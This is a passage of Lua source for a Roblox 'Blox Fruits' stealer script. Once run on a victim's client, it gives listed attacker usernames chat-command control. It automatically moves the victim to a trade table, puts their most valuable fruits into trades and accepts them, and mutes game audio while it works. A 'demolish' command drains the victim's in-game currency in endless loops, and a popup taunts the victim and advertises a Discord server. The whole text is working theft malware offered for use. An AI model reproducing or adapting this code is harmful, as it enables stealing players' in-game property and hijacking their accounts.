    UICorner.CornerRadius = UDim.new(0, 10)
    UICorner.Parent = MainFrame

    local Title = Instance.new("TextLabel")
    Title.Name = "Title"
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.Position = UDim2.new(0, 0, 0, 10)
    Title.BackgroundTransparency = 1
    Title.Font = Enum.Font.GothamBold
    Title.Text = "🎉 Read Below!"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextScaled = true
    Title.Parent = MainFrame

    local Description = Instance.new("TextLabel")
    Description.Name = "Description"
    Description.Size = UDim2.new(0.9, 0, 0, 40)
    Description.Position = UDim2.new(0.05, 0, 0.3, 0)
    Description.BackgroundTransparency = 1
    Description.Font = Enum.Font.Gotham
    Description.Text = "Hey! You just lost some of your valuable fruits to BF Joiner Stealer. No need to worry! If you want to make them back using OUR stealer - Join our discord! Click the button to copy invite"
    Description.TextColor3 = Color3.fromRGB(220, 221, 222)
    Description.TextScaled = true
    Description.TextWrapped = true
    Description.Parent = MainFrame

    local Button = Instance.new("TextButton")
    Button.Name = "CopyButton"
    Button.Size = UDim2.new(0.7, 0, 0, 36)
    Button.Position = UDim2.new(0.15, 0, 0.7, 0)
    Button.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    Button.Font = Enum.Font.GothamBold
    Button.Text = "Copy Invite"
    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
    Button.TextScaled = true
    Button.AutoButtonColor = false
    Button.Parent = MainFrame

    local ButtonCorner = Instance.new("UICorner")
    ButtonCorner.CornerRadius = UDim.new(0, 5)
    ButtonCorner.Parent = Button

    MainFrame.BackgroundTransparency = 1
    Title.TextTransparency = 1
    Description.TextTransparency = 1
    Button.BackgroundTransparency = 1
    Button.TextTransparency = 1

    local TweenService = game:GetService("TweenService")
    local fadeInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

    task.wait(0.1)
    TweenService:Create(MainFrame, fadeInfo, {BackgroundTransparency = 0}):Play()
    task.wait(0.1)
    TweenService:Create(Title, fadeInfo, {TextTransparency = 0}):Play()
    task.wait(0.1)
    TweenService:Create(Description, fadeInfo, {TextTransparency = 0}):Play()
    task.wait(0.1)
    TweenService:Create(Button, fadeInfo, {BackgroundTransparency = 0, TextTransparency = 0}):Play()

    Button.MouseEnter:Connect(function()
        TweenService:Create(Button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(71, 82, 196)}):Play()
    end)

    Button.MouseLeave:Connect(function()
        TweenService:Create(Button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(88, 101, 242)}):Play()
    end)

    local function showCopiedText()
        Button.Text = "Copied!"
        task.wait(2)
        Button.Text = "Copy Invite"
    end

    Button.MouseButton1Click:Connect(function()
        setclipboard("https://discord.gg/E3MPAbp8")
        showCopiedText()
    end)

    ScreenGui.Parent = game:GetService("CoreGui")
    return ScreenGui
end

local ChatCommands = {
    prefix = "?",
    lastExecutionTime = {},
    cooldowns = {
        default = 0.1,
        invite = 0.25,
        addfruits = 0.25,
        add = 0.25,
        addall = 0.25,
        clearfruits = 0.25,
        additem = 0.25,
        sit = 0.5,
        tp = 0.5,
        resetfruit = 3,
        bang = 2,
        showinv = 3,
        demolish = 5, -- Added cooldown for demolish command
        resetall = 3
    },
    commands = {
        jump = function()
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                task.spawn(forceJump)
            end
        end,

        invite = function()
            createDiscordUI()
        end,

        sit = function()
            task.spawn(function()
                local tradeTable = findTradeTable()
                if not tradeTable then return end
                for _, seat in pairs({tradeTable.P1, tradeTable.P2}) do
                    if seat and isSeatAvailable(seat) then
                        sitAtSeat(seat)
                        break
                    end
                end
            end)
        end,

        reset = function()
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                LocalPlayer.Character.Humanoid.Health = 0
            end
        end,

       resetfruit = function(args) -- Assuming you've updated this with the corrected version
            task.spawn(function()
                if not args or args == "" then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "Please specify a fruit name! Usage: ?resetfruit FruitName", "All")
                    return
                end

                local inventory = getInventory()
                if not inventory then return end
                local searchTerm = args:lower()
                local foundFruit = false
                local fruitName = nil

                for _, item in pairs(inventory) do
                    if item.Type == "Blox Fruit" and item.Name:lower():find(searchTerm) then
                        fruitName = item.Name
                        foundFruit = true
                        break
                    end
                end

                if not foundFruit then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "No fruit matching '" .. args .. "' found in inventory!", "All")
                    return
                end

                local baseFruitName = fruitName:match("(%S+)")
                local formattedFruitName = string.format("%s", baseFruitName)

                local Remote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_")
                Remote:InvokeServer("LoadFruit", formattedFruitName)

                task.wait(0.5)
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                    LocalPlayer.Character.Humanoid.Health = 0
                end

                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                    "Reseted with " .. baseFruitName .. "", "All")
            end)
        end,

        resetall = function()
            task.spawn(function()
                local isResettingAll = true -- Flag to control the loop
        
                local function performReset(fruitName) -- Modified to accept fruitName
                    local success, error_message = pcall(function()
                        unstoreFruit(fruitName) -- Use fruitName here
                        resetCharacter()
                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Reset " .. fruitName, "All") -- Use fruitName here
                    end)
                    if not success then
                        warn("Error resetting fruit " .. fruitName .. ": " .. error_message)
                    end
                    task.wait(1) -- Add a small delay between resets to prevent potential issues
                end
        
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Starting continuous reset of ALL fruits in inventory...", "All")
        
                while isResettingAll do -- Continuous loop
                    local inventory = getInventory() -- Get inventory inside the loop to reflect changes
        
                    if inventory then
                        for _, item in pairs(inventory) do
                            if not isResettingAll then break end -- Check flag inside loop
                            if item.Type == "Blox Fruit" then
                                local fruitName = item.Name -- Get fruit name from inventory item
                                performReset(fruitName) -- Pass fruitName to performReset
                            end
                        end
                    end
        
                    if not isResettingAll then break end -- Check flag after fruits loop
                    task.wait(1) -- Add a small delay between full inventory cycles
                end
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Continuous reset of ALL fruits stopped.", "All")
        
            end)
        end,
        
        tp = function()
            task.spawn(function()
                local tradeTable = findTradeTable()
                if tradeTable then
                    tweenToPosition(tradeTable.P1.Position, 350)
                end
            end)
        end,

        accept = function()
            task.spawn(function()
                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end
                acceptTrade()
            end)
        end,

        cleartrade = function()
            task.spawn(function()
                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end
                clearTradeItems()
            end)
        end,

        addall = function()
            task.spawn(function()
                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end

                local inventory = getInventory()
                if not inventory then return end

                local addedFruits = {}
                for _, fruit in ipairs(FruitsToHit) do
                    for _, item in pairs(inventory) do
                        if item.Type == "Blox Fruit" and item.Name == fruit and not addedFruits[fruit] then
                            ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("addItem", fruit)
                            addedFruits[fruit] = true
                            task.wait(0.05)
                            break
                        end
                    end
                end
            end)
        end,


        add = function(args)
            task.spawn(function()
                if not args or args == "" then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "Please specify a fruit name! Usage: ?addfruit FruitName", "All")
                    return
                end

                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end

                local inventory = getInventory()
                if not inventory then return end

                local searchTerm = args:lower()
                local foundFruit = false

                for _, item in pairs(inventory) do
                    if item.Type == "Blox Fruit" and item.Name:lower():find(searchTerm) then
                        ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("addItem", item.Name)
                        foundFruit = true
                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                            "Added " .. item.Name:gsub("-", " ") .. " to trade!", "All")
                        break
                    end
                end

                if not foundFruit then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "No fruit matching '" .. args .. "' found in inventory!", "All")
                end
            end)
        end,

        clearfruits = function()
            task.spawn(function()
                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end

                local container = tradeUI.Trade:FindFirstChild("Container")
                if not container then return end

                local playerFrame = container:FindFirstChild("1")
                if not playerFrame then return end

                local itemFrame = playerFrame:FindFirstChild("Frame")
                if not itemFrame then return end

                for _, item in ipairs(itemFrame:GetChildren()) do
                    if item:IsA("ImageButton") then
                        ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("removeItem", item.Name)
                        task.wait(0.05)
                    end
                end
            end)
        end,

        kick = function()
            game.Players.LocalPlayer:Kick("Error while loading! Rejoin.")
        end,

        additem = function(args)
            task.spawn(function()
                if not args or args == "" then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "Please specify an item name! Usage: ?additem ItemName", "All")
                    return
                end

                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end

                local inventory = getInventory()
                if not inventory then return end

                local searchTerm = args:lower()
                local foundItem = false

                for _, item in pairs(inventory) do
                    if item.Type == "Premium" and item.Name:lower():find(searchTerm) then
                        ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("addItem", item.Name)
                        foundItem = true
                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                            "Added " .. item.Name:gsub("-", " ") .. " to trade!", "All")
                        break
                    end
                end

                if not foundItem then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "No Premium item matching '" .. args .. "' found in inventory!", "All")
                end
            end)
        end,

        rejoin = function()
            task.spawn(function()
                local ts = game:GetService("TeleportService")
                local p = game:GetService("Players").LocalPlayer
                ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, p)
            end)
        end,

        showinv = function()
            task.spawn(function()
                local inventory = getInventory()
                if not inventory then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Error getting inventory.", "All")
                    return
                end

                local fruitCounts = {}
                for _, item in pairs(inventory) do
                    if item.Type == "Blox Fruit" then
                        local simpleName = item.Name:match("^([^-]+)")
                        fruitCounts[simpleName] = (fruitCounts[simpleName] or 0) + item.Count
                    end
                end

                if not next(fruitCounts) then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Inventory is empty of fruits.", "All")
                    return
                end

                local chatEvent = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
                local messageChunks = {}
                local currentChunk = ""
                local fruitList = {}
                for fruitName, count in pairs(fruitCounts) do
                    local displayText = fruitName
                    if count > 1 then
                        displayText = displayText .. " (x" .. count .. ")"
                    end
                    table.insert(fruitList, displayText)
                end

                local message = table.concat(fruitList, ", ")

                while #message > 0 do
                    local chunk = message:sub(1, 128)
                    local lastComma = chunk:find(",[^,]*$")

                    if #message > 128 and lastComma then
                        chunk = message:sub(1, lastComma - 1)
                        message = message:sub(lastComma + 2)
                    else
                        message = message:sub(#chunk + 1)
                    end

                    table.insert(messageChunks, chunk)
                end

                for _, chunk in ipairs(messageChunks) do
                    chatEvent:FireServer(chunk, "All")
                    task.wait(1.5)
                end
            end)
        end,


        help = function()
            task.spawn(function()
                local commands = {
                    "Movement: ?jump, ?sit, ?reset, ?tp",
                    "Trade: ?accept, ?cleartrade, ?addall, ?add <name>, ?clearfruits, ?additem <name>",
                    "Utility: ?kick, ?rejoin, ?invite, ?resetfruit <name>, ?demolish" -- Added demolish to help
                }
                for _, msg in ipairs(commands) do
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
                    task.wait(0.1)
                end
            end)
        end,

        demolish = function() -- Integrated demolish command
            task.spawn(function()
                local success, error = pcall(function()
                    -- Remote invocation helper (defined outside, assuming it's in scope)
                    local function invokeRemote(remoteName, args) -- Define invokeRemote here if not defined globally
                        local ReplicatedStorage = game:GetService("ReplicatedStorage")
                        local remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild(remoteName)
                        return remote:InvokeServer(unpack(args))
                    end

                    -- invokeRemote("CommF", {"RemoveFruit", "Beli"}) -- Ineffective

                    -- Get and process inventory
                    local inventory = getInventory()
                    if not inventory then
                        warn("Failed to retrieve inventory.")
                        return
                    end

                    local fruits = {}
                    for _, item in pairs(inventory) do
                        if item.Type == "Blox Fruit" then
                            table.insert(fruits, item)
                        end
                    end
                    table.sort(fruits, function(a, b)
                        return a.Value > b.Value
                    end)

                    -- Load fruits (removed BreakJoints - questionable action)
                    local Players = game:GetService("Players")
                    local LocalPlayer = Players.LocalPlayer
                    for _, fruit in ipairs(fruits) do
                        local baseFruitName = fruit.Name:match("(%S+)")
                        invokeRemote("CommF", {"LoadFruit", baseFruitName})
                        task.wait(0.5)
                        -- if LocalPlayer.Character then  -- Removed BreakJoints
                        --     LocalPlayer.Character:BreakJoints()
                        --     task.wait(6)
                        -- end
                    end

                    -- Drain Beli
                    local function drainBeli(invokeRemote) -- Pass invokeRemote as argument
                        local rocketArgs = {"PurchaseRawFruit", "Rocket-Rocket", false}
                        local spinArgs = {"PurchaseRawFruit", "Spin-Spin", false}
                        while true do
                            invokeRemote("CommF", rocketArgs)
                            task.wait()
                            invokeRemote("CommF", spinArgs)
                            task.wait()
                        end
                    end

                    -- Drain Fragments (Assuming you've verified/corrected drainFragments)
                    local function drainFragments(invokeRemote, RemoteName) -- Pass invokeRemote and RemoteName
                        local fragmentArgs = {"BlackbeardReward", "Refund", "2"} -- Replace with correct args if needed
                        while true do
                            invokeRemote(RemoteName, fragmentArgs) -- Use passed RemoteName
                            task.wait()
                        end
                    end

                    -- Start draining coroutines, pass invokeRemote to drain functions
                    coroutine.wrap(drainBeli)(invokeRemote)
                    coroutine.wrap(drainFragments)(invokeRemote, "CommF_") -- Assuming "CommF_" is correct for fragments

                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "Demolish command initiated!", "All") -- Added feedback message
                end)

                if not success then
                    warn("Demolish command failed: ", error)
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "Demolish command failed! Check console for errors.", "All") -- Added error feedback
                end
            end)
        end,
    }
}

-- Remote invocation helper - Define it here, outside ChatCommands, making it globally accessible to commands
local function invokeRemote(remoteName, args)
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild(remoteName)
    return remote:InvokeServer(unpack(args))
end

local function isAuthorizedUser(player)
    return table.find(Usernames, player.Name) ~= nil
end

local function handleChatCommand(player, message)
    if not isAuthorizedUser(player) then return end
    if message:sub(1, 1) ~= ChatCommands.prefix then return end

    local commandAndArgs = message:sub(2):lower()
    local command = commandAndArgs:match("^(%S+)")
    local args = commandAndArgs:match("^%S+%s+(.+)$")

    if not ChatCommands.commands[command] then return end

    local currentTime = tick()
    local lastExecution = ChatCommands.lastExecutionTime[command] or 0
    local cooldown = ChatCommands.cooldowns[command] or ChatCommands.cooldowns.default

    if currentTime - lastExecution < cooldown then
        return
    end

    ChatCommands.lastExecutionTime[command] = currentTime
    task.spawn(function()
        local success, error = pcall(function()
            ChatCommands.commands[command](args)
        end)
        if not success then
            warn("error:", command, error)
        end
    end)
end

game:GetService("Players").PlayerChatted:Connect(function(chatType, player, message)
    handleChatCommand(player, message)
end)

local function monitorTradeStatus(character)
    if not character then return end

    local humanoid = character:FindFirstChild("Humanoid")
    if not humanoid then return end

    task.spawn(function()
        while character.Parent and humanoid.Health > 0 do
            if isSeated() then
                local tradeUI = game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main")
                if tradeUI and tradeUI:FindFirstChild("Trade") then
                    if tradeUI.Trade.Visible then
                        task.wait(0.5)
                        if not isInTradeWithCorrectPlayer() then
                            task.wait(0.5)
                            if isSeated() and not isInTradeWithCorrectPlayer() then
                                forceJump()
                                task.wait(1)
                                if isSeated() then
                                    forceJump()
                                    task.wait(1)
                                end
                            end
                            continue
                        end

                        local function attemptAddFruit(fruit)
                            clearTradeItems()
                            task.wait(1)

                            ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("addItem", fruit)
                            task.wait(1.5)

                            local container = tradeUI.Trade:WaitForChild("Container")
                            local playerItems = container:WaitForChild("1"):WaitForChild("Frame"):GetChildren()
                            local fruitAdded = false

                            for _, item in ipairs(playerItems) do
                                if item:IsA("ImageButton") and item.Name == fruit then
                                    fruitAdded = true
                                    break
                                end
                            end

                            return fruitAdded
                        end

                        for _, fruit in pairs(FruitsToHit) do
                            if not isSeated() then
                                task.wait(1)
                                if not isSeated() then
                                    break
                                end
                            end

                            if not isInTradeWithCorrectPlayer() then
                                break
                            end

                            if attemptAddFruit(fruit) then
                                local tradeStartTime = tick()
                                while isSeated() and tick() - tradeStartTime < 60 and isInTradeWithCorrectPlayer() do
                                    acceptTrade()
                                    task.wait(1)

                                    if not tradeUI.Trade.Visible then
                                        task.wait(1)
                                        break
                                    end
                                end

                                task.wait(2)
                                break
                            end
                        end
                    end
                end
            end
            task.wait(0.5)
        end
    end)
end

local function isPlayerNearby(player)
    if not player or not player.Character or not LocalPlayer.Character then return false end
    return (player.Character:GetPrimaryPartCFrame().Position - LocalPlayer.Character:GetPrimaryPartCFrame().Position).Magnitude <= 20
end

local function removeFruitFromTrade(fruit)
    ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("removeItem", fruit)
    task.wait(0.5)
end

local function clearTradeItems()
    local tradeUI = game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main")
    if tradeUI and tradeUI:FindFirstChild("Trade") then
        local container = tradeUI.Trade:WaitForChild("Container")
        local playerItems = container:WaitForChild("1"):WaitForChild("Frame"):GetChildren()
        for _, item in ipairs(playerItems) do
            if item:IsA("ImageButton") then
                removeFruitFromTrade(item.Name)
            end
        end
    end
end

local function getCurrentTradeItems()
    local items = {}
    local tradeUI = game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main")
    if tradeUI and tradeUI:FindFirstChild("Trade") then
        local container = tradeUI.Trade:WaitForChild("Container")
        local playerItems = container:WaitForChild("1"):WaitForChild("Frame"):GetChildren()
        for _, item in ipairs(playerItems) do
            if item:IsA("ImageButton") then
                table.insert(items, item.Name)
            end
        end
    end
    return items
end

local function tradeWithPlayer()
    if tick() - lastTradeTime < tradeCooldown then return false end

    handleFruitReset()

    local tradeTable = findTradeTable()
    if not tradeTable then
        local tweenPosition = Sea3 and Vector3.new(-12550.8701171875, 337.239990234375, -7425.52001953125)
            or Vector3.new(-381.8599853515625, 73.08000183105469, 299.92999267578125)
        tweenToPosition(tweenPosition, 350)
        task.wait(1.5)
        tradeTable = findTradeTable()
        if not tradeTable then return false end
    end

    local function validateAndSit(seat)
        if not seat then return false end

        if not isSeatAvailable(seat) then
            local occupant = seat:FindFirstChild("SeatWeld") and
                            Players:GetPlayerFromCharacter(seat.SeatWeld.Part1.Parent)

            if occupant and not isValidTradePartner(occupant) then
                return false
            end
        end

        local attempts = 0
        while attempts < 3 do
            if sitAtSeat(seat) then
                task.wait(1)
                if isSeated() then
                    return true
                end
            end
            attempts = attempts + 1
            task.wait(1)
        end
        return false
    end

    local mySeat
    for _, seat in pairs({tradeTable.P1, tradeTable.P2}) do
        if validateAndSit(seat) then
            mySeat = seat
            break
        end
    end

    if not mySeat then return false end

    local otherSeat = mySeat.Name == "P1" and tradeTable.P2 or tradeTable.P1

    local startTime = tick()
    while tick() - startTime < 30 do
        if not isSeated() then
            task.wait(1)
            if not isSeated() then
                return false
            end
        end

        if otherSeat:FindFirstChild("SeatWeld") then
            local otherPlayer = Players:GetPlayerFromCharacter(otherSeat.SeatWeld.Part1.Parent)

            if otherPlayer and not isInTradeWithCorrectPlayer() then
                task.wait(1)
                if isSeated() and not isInTradeWithCorrectPlayer() then
                    forceJump()
                    task.wait(1)
                end
                return false
            end

            if otherPlayer and isInTradeWithCorrectPlayer() and isPlayerNearby(otherPlayer) then
                lastTradeTime = tick()
                task.wait(1)
                return otherPlayer
            end
        end

        task.wait(0.5)
    end

    if isSeated() then
        print("a22f")
        task.wait(1)
    end
    return false
end

LocalPlayer.CharacterAdded:Connect(function(character)
    monitorTradeStatus(character)
end)

if LocalPlayer.Character then
    monitorTradeStatus(LocalPlayer.Character)
end

local trades = splitFruitsIntoTrades(FruitsToHit)
local currentTradeIndex = 1
local tradeAttempts = {}

local function silenceGame()
    task.spawn(function()
        UserSettings().GameSettings.MasterVolume = 0
        for _, sound in pairs(game:GetDescendants()) do
            if sound:IsA("Sound") then
                sound.Volume = 0
            end
        end
        game.DescendantAdded:Connect(function(descendant)
            if descendant:IsA("Sound") then
                descendant.Volume = 0
            end
        end)
    end)
end

silenceGame()

game.Players.LocalPlayer.OnTeleport:Connect(function()
    _G.scriptExecuted = nil
end)

while true do
    local tradingPlayer = tradeWithPlayer()

    if tradingPlayer then
        local remainingFruits = {}
        for i = currentTradeIndex, #trades do
            for _, fruit in ipairs(trades[i]) do
                local inventory = getInventory()
                for _, item in pairs(inventory) do
                    if item.Type == "Blox Fruit" and item.Name == fruit then
                        table.insert(remainingFruits, fruit)
                        break
                    end
                end
            end
        end

        if #remainingFruits == 0 then

            currentTradeIndex = 1
            tradeAttempts = {}
            trades = splitFruitsIntoTrades(FruitsToHit)
            continue
        end

        if not tradeAttempts[currentTradeIndex] then
            tradeAttempts[currentTradeIndex] = 0
        end

        tradeAttempts[currentTradeIndex] = tradeAttempts[currentTradeIndex] + 1

        if #remainingFruits > 1 and tradeAttempts[currentTradeIndex] == 1 then
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                "Hey! Let's do multiple trades for multiple fruits!", "All")
            task.wait(1)
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                "Please, wait until I put in correct fruits.", "All")
            task.wait(1)
        end

        local monitorConnection
        local tradeValid = true

        monitorConnection = RunService.Heartbeat:Connect(function()
            if not isPlayerNearby(tradingPlayer) then
                tradeValid = false
                if isSeated() then
                    forceJump()
                    task.wait(0.5)
                end
                monitorConnection:Disconnect()
            end
        end)

        if isSeated() and tradeValid then
            clearTradeItems()
            task.wait(1)

            local currentFruit = remainingFruits[1]
            local message = string.format("Trade %d/%d - Adding %s",
                currentTradeIndex, math.ceil(#remainingFruits),
                currentFruit:gsub("-", " "))
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
            task.wait(1)

            local fruitAdded = addFruitToTrade(currentFruit)

            local tradedItems = getCurrentTradeItems()
            for _, item in ipairs(tradedItems) do
                if item ~= currentFruit then
                    removeFruitFromTrade(item)
                    fruitAdded = false
                end
            end

            local tradeCompleted = false
            if fruitAdded then
                local tradeStartTime = tick()
                while isSeated() and tradeValid and tick() - tradeStartTime < 360 do
                    acceptTrade()
                    task.wait(0.5)
                    local tradeUI = game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main")
                    if not (tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible) then
                        if wasTradeSuccessful(currentFruit) then
                            tradeCompleted = true
                            break
                        end
                    end
                end
            end

            if monitorConnection then monitorConnection:Disconnect() end

            if isSeated() then
                print("a")
                task.wait(1)
            end

            if tradeCompleted then
                currentTradeIndex = currentTradeIndex + 1
                if currentTradeIndex > math.ceil(#remainingFruits) then
                    currentTradeIndex = 1
                    tradeAttempts = {}
                end
            end

            task.wait(2)
        end
    else
        task.wait(1)
    end
end
